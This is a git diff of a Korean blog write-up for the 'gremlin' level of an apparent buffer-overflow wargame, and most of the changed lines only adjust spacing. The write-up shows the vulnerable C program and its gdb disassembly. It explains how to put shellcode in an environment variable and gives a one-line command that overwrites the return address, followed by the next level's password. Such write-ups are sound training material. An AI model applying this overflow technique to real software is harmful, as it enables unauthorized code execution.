@@ -5,7 +5,7 @@ tags: [stack buffer overflow]
 ---
 
 ## gremlin
-<hr style="border-top: 1px solid;"> 
+<hr style="border-top: 1px solid;"><br>
 
 ```c
 /*
@@ -25,6 +25,9 @@ int main(int argc, char *argv[])
     printf("%s\n", buffer);
 }
 ```
+
+<br>
+
 ```
 (gdb)
 0x8048430 <main>:       push   %ebp
@@ -55,30 +58,42 @@ int main(int argc, char *argv[])
 0x804847a <main+74>:    ret
 ```
 
-<br>
+<br><br>
 <hr style="border: 2px solid;"> 
-<br>
+<br><br>
 
 ## Solution
-<hr style="border-top: 1px solid;"> 
+<hr style="border-top: 1px solid;"><br>
 
-버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음. 이 때 환경변수를 이용해서 풀 수 있음.
+버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음. 
+
+이 때 환경변수를 이용해서 풀 수 있음.
+
+<br>
 
 **환경 변수에서 중요한 부분은 환경 변수가 스택에 위치한다는 점과 셸에서 값을 설정할 수 있다는 점이다.**  
 
-환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. 
-
-+ Link : <a href="https://ind2x.github.io/posts/environment_value/" target="_blank">환경변수 설정 및 주소 구하기</a>
-
-**추가로 환경변수의 주소를 구할 때, 프로그램 이름의 길이가 환경변수 위치에 영향을 준다. 따라서 cobolt가 6글자이므로 프로그램 명을 6글자로 설정하는 것이 좋다.**
+환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로, 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. 
 
 <br>
 
-환경변수 주소 ```ex)0xbffffc34``` 를 리턴 주소로 해주면 끝임. 
-```console
-./cobolt `python -c 'print "\x90"*20+"\x34\xfc\xff\xbf"'`
+Link 
+: <a href="https://ind2x.github.io/posts/environment_value/" target="_blank">환경변수 설정 및 주소 구하기</a>
+
+<br>
+
+```추가로 환경변수의 주소를 구할 때, 프로그램 이름의 길이가 환경변수 위치에 영향을 준다.``` 
+
+따라서 cobolt가 6글자이므로 프로그램 명을 6글자로 설정하는 것이 좋다.
+
+<br>
+
+환경변수 주소 ```ex)0xbffffc34``` 를 리턴 주소로 해주면 끝임.
+: ```./cobolt `python -c 'print "\x90"*20+"\x34\xfc\xff\xbf"'```
+
+<br>
+
 my-pass : hacking exposed
-```
 
 <br>
 <hr style="border: 2px solid;"> 
